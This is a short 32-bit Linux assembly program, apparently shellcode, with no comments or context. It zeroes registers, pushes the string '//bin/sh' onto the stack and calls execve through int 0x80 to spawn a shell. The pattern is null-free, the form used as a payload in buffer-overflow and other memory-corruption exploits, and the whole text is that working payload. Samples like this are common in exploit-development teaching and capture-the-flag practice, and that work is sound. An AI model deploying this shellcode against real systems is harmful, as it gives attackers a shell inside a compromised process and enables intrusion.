
global _start

section .text

_start:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	push edx
	push 0x68732f6e 
	push 0x69622f2f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	push edx
	mov edx,esp
	mov al,0xb
	int 0x80
